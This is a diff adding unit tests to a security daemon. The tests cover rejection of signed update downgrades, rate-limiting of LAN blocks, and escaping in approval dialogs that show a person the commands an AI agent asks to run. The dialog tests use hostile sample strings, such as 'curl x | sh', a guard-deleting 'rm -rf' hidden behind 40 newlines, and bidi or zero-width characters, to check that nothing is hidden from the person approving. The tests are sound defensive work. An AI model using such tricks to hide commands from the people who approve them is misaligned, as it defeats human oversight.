@@ -548,6 +548,28 @@ class Updater(unittest.TestCase):
             with self.assertRaises(updater.UpdateError):
                 updater.stage_kernel(self.manifest("7.2.11"), dry_run=True)
 
+    def guard_manifest(self, version):
+        art = self.d / "rel.tar.gz"
+        art.write_bytes(b"release")
+        mf = self.d / "guard-manifest.json"
+        mf.write_text(json.dumps({"veloguard": {"version": version, "artifact": str(art),
+                                                "sha256": updater.sha256(art)}}))
+        subprocess.run(["openssl", "dgst", "-sha256", "-sign", str(self.key), "-out",
+                        str(mf) + ".sig", str(mf)], check=True)
+        return str(mf)
+
+    def test_guard_downgrade_refused_and_not_offered(self):
+        # a validly-signed old manifest (replay, stale mirror) must not roll the guard back
+        with mock.patch.object(updater, "local_veloguard_version", return_value="0.3.0"):
+            old = self.guard_manifest("0.2.9")
+            self.assertFalse(updater.check(old)["domains"]["veloguard"]["update_available"])
+            with self.assertRaises(updater.UpdateError):
+                updater.apply_veloguard(old, dry_run=True)
+            self.assertIn("already at", updater.apply_veloguard(self.guard_manifest("0.3.0"), dry_run=True))
+            new = self.guard_manifest("0.3.1")
+            self.assertTrue(updater.check(new)["domains"]["veloguard"]["update_available"])
+            self.assertIn("[dry-run]", updater.apply_veloguard(new, dry_run=True))
+
     def test_package_name_cannot_traverse(self):
         with mock.patch.object(updater, "local_kernel_version", return_value="none"), \
              mock.patch.object(updater, "running_kernel_version", return_value="6.0"):
@@ -1062,6 +1084,52 @@ class AskThePerson(unittest.TestCase):
         self.assertIn("must_ask", src)
 
 
+class DialogText(unittest.TestCase):
+    """An agent chooses the text an Approve dialog shows; nothing in it may
+    render as something else. Same cases as rust/src/sys.rs."""
+
+    def test_nothing_a_requester_writes_hides_in_a_dialog(self):
+        from guardd.approve import esc, visible
+        self.assertEqual(visible("echo hi\n\n; curl x | sh"), "echo hi\\n\\n; curl x | sh")
+        self.assertEqual(visible("a\u202eb\u200bc\u2066d"), "a\\u{202e}b\\u{200b}c\\u{2066}d")
+        self.assertEqual(visible("x\x1b[2Jy\x7f\x85"), "x\\x1b[2Jy\\x7f\\x85")
+        self.assertEqual(visible("a\xa0b\u3000c\u2028d\u3164e"), "a\\xa0b\\u{3000}c\\u{2028}d\\u{3164}e")
+        self.assertEqual(visible("Z\u0301\u0301"), "Z\\u{0301}\\u{0301}")
+        self.assertEqual(visible("true        x"), "true ⟨8 spaces⟩ x")
+        self.assertEqual(visible("a   b"), "a   b")
+        self.assertEqual(visible("Обнови пакетите 🙂 — ok"), "Обнови пакетите 🙂 — ok")
+        self.assertEqual(visible("/tmp/\udcff"), "/tmp/\\xff")      # a non-UTF-8 byte in argv
+        self.assertEqual(esc("<\u202e>"), "&lt;\\u{202e}&gt;")
+
+    def test_hook_dialog_flags_hidden_characters(self):
+        from guardd import approve
+        t = approve.text_for("Codex", "echo ok" + "\n" * 40 + "; rm -rf ~/.config/veloguard",
+                             "rewrites the guard", "tamper", "/home/x")
+        self.assertNotIn("\n\n\n", t.split("</tt>")[0])        # no line breaks inside the command
+        self.assertIn("show on screen", t)
+        self.assertNotIn("show on screen", approve.text_for("Codex", "ls -la", "x", "tamper", "/home/x"))
+
+    def test_root_dialog_shows_everything_and_flags_it(self):
+        import importlib.machinery
+        import importlib.util
+        path = Path(__file__).resolve().parents[1] / "bin" / "veloguard-elevate-root"
+        loader = importlib.machinery.SourceFileLoader("vg_elevate_root", str(path))
+        spec = importlib.util.spec_from_loader("vg_elevate_root", loader)
+        root = importlib.util.module_from_spec(spec)
+        loader.exec_module(root)
+        who = {"name": "Codex\u202e", "pid": 1, "exe": "/x", "verified": True}
+        t = root.command_text(who, "bash -c 'apt update" + "\n" * 40 + "; curl x|sh'", "/home/x",
+                              "", "", 0)
+        cmd = t.split("<tt>")[1].split("</tt>")[0]
+        self.assertNotIn("\n", cmd)
+        self.assertIn("curl x|sh", cmd)
+        self.assertIn("show on screen", t)
+        self.assertNotIn("\u202e", t)
+        # the fallback (guard module unavailable) hides nothing either
+        with mock.patch.dict(sys.modules, {"guardd.approve": None}):
+            self.assertEqual(root.visible("a\nb\u202ec"), "a\\x0ab\\u202ec")
+
+
 class HoneypotLan(unittest.TestCase):
     def test_lan_attackers_blockable_but_never_the_gateway(self):
         from guardd import __main__ as m
@@ -1071,6 +1139,22 @@ class HoneypotLan(unittest.TestCase):
             self.assertFalse(m._lan_blockable("192.168.1.5"))
             self.assertFalse(m._lan_blockable("fe80::1"))
             self.assertFalse(m._lan_blockable("127.0.0.1"))
+
+    def test_lan_blocks_still_count_toward_the_rate_limit(self):
+        # The range check returns before the rate limit; a LAN visitor passing
+        # the first must not skip the second (spoofed-neighbour flood).
+        from guardd import __main__ as m
+        from guardd.policy import DEFAULT_POLICY, PolicyEngine
+        engine = PolicyEngine({**DEFAULT_POLICY, "rate_limit": {"max_actions": 3, "window_seconds": 60}})
+        ex = mock.Mock()
+        ex.block_ip.return_value = "ok"
+        with mock.patch.object(m, "_lan_neighbours_to_keep", return_value={"192.168.1.1"}), \
+             mock.patch.object(m.PolicyEngine, "shared", return_value=engine), \
+             mock.patch.object(m, "record"):
+            out = [m._auto_block(ex, f"192.168.1.{n}") for n in range(10, 16)]
+        self.assertEqual(ex.block_ip.call_count, 3)
+        self.assertTrue(all(o == "ok" for o in out[:3]))
+        self.assertTrue(all("rate limit" in o for o in out[3:]))
 
 
 class IncidentHandOff(unittest.TestCase):
